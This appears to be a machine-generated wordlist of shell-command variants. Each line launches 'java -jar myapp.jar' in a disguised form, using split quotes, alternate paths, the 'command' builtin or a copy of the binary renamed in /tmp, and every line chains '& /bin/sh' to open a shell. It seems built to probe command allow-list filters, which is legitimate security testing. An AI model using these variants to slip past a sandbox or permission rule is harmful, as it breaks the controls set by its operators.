"java"  -jar myapp.jar & /bin/sh
"java" -jar myapp.jar & /bin/sh
"java"-jar myapp.jar & /bin/sh
'java'  -jar myapp.jar & /bin/sh
'java' -jar myapp.jar & /bin/sh
'java'-jar myapp.jar & /bin/sh
/bin/"java"  -jar myapp.jar & /bin/sh
/bin/"java" -jar myapp.jar & /bin/sh
/bin/"java"-jar myapp.jar & /bin/sh
/bin/'java'  -jar myapp.jar & /bin/sh
/bin/'java' -jar myapp.jar & /bin/sh
/bin/'java'-jar myapp.jar & /bin/sh
/bin/j""ava  -jar myapp.jar & /bin/sh
/bin/j""ava -jar myapp.jar & /bin/sh
/bin/j""ava-jar myapp.jar & /bin/sh
/bin/j''ava  -jar myapp.jar & /bin/sh
/bin/j''ava -jar myapp.jar & /bin/sh
/bin/j''ava-jar myapp.jar & /bin/sh
/bin/java  -jar myapp.jar & /bin/sh
/bin/java -jar myapp.jar & /bin/sh
/bin/java-jar myapp.jar & /bin/sh
/usr/bin/"java"  -jar myapp.jar & /bin/sh
/usr/bin/"java" -jar myapp.jar & /bin/sh
/usr/bin/"java"-jar myapp.jar & /bin/sh
/usr/bin/'java'  -jar myapp.jar & /bin/sh
/usr/bin/'java' -jar myapp.jar & /bin/sh
/usr/bin/'java'-jar myapp.jar & /bin/sh
/usr/bin/j""ava  -jar myapp.jar & /bin/sh
/usr/bin/j""ava -jar myapp.jar & /bin/sh
/usr/bin/j""ava-jar myapp.jar & /bin/sh
/usr/bin/j''ava  -jar myapp.jar & /bin/sh
/usr/bin/j''ava -jar myapp.jar & /bin/sh
/usr/bin/j''ava-jar myapp.jar & /bin/sh
/usr/bin/java  -jar myapp.jar & /bin/sh
/usr/bin/java -jar myapp.jar & /bin/sh
/usr/bin/java-jar myapp.jar & /bin/sh
command "java"  -jar myapp.jar & /bin/sh
command "java" -jar myapp.jar & /bin/sh
command "java"-jar myapp.jar & /bin/sh
command 'java'  -jar myapp.jar & /bin/sh
command 'java' -jar myapp.jar & /bin/sh
command 'java'-jar myapp.jar & /bin/sh
command j""ava  -jar myapp.jar & /bin/sh
command j""ava -jar myapp.jar & /bin/sh
command j""ava-jar myapp.jar & /bin/sh
command j''ava  -jar myapp.jar & /bin/sh
command j''ava -jar myapp.jar & /bin/sh
command j''ava-jar myapp.jar & /bin/sh
command java  -jar myapp.jar & /bin/sh
command java -jar myapp.jar & /bin/sh
command java-jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_1 && /tmp/tmp_bin_1 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_10 && /tmp/tmp_bin_10 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_100 && /tmp/tmp_bin_100 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_101 && /tmp/tmp_bin_101 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_102 && /tmp/tmp_bin_102 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_103 && /tmp/tmp_bin_103 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_104 && /tmp/tmp_bin_104 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_105 && /tmp/tmp_bin_105 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_106 && /tmp/tmp_bin_106 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_107 && /tmp/tmp_bin_107 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_108 && /tmp/tmp_bin_108 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_109 && /tmp/tmp_bin_109 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_11 && /tmp/tmp_bin_11 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_110 && /tmp/tmp_bin_110 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_111 && /tmp/tmp_bin_111 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_112 && /tmp/tmp_bin_112 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_113 && /tmp/tmp_bin_113 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_114 && /tmp/tmp_bin_114 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_115 && /tmp/tmp_bin_115 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_116 && /tmp/tmp_bin_116 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_117 && /tmp/tmp_bin_117 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_118 && /tmp/tmp_bin_118 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_119 && /tmp/tmp_bin_119 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_12 && /tmp/tmp_bin_12 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_120 && /tmp/tmp_bin_120 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_121 && /tmp/tmp_bin_121 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_122 && /tmp/tmp_bin_122 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_123 && /tmp/tmp_bin_123 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_124 && /tmp/tmp_bin_124 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_125 && /tmp/tmp_bin_125 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_126 && /tmp/tmp_bin_126 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_127 && /tmp/tmp_bin_127 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_128 && /tmp/tmp_bin_128 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_129 && /tmp/tmp_bin_129 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_13 && /tmp/tmp_bin_13 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_130 && /tmp/tmp_bin_130 -jar myapp.jar & /bin/sh
cp $(which java 2>/dev/null || echo java) /tmp/tmp_bin_131 && /tmp/tmp_bin_131 -jar myapp.jar & /bin/sh
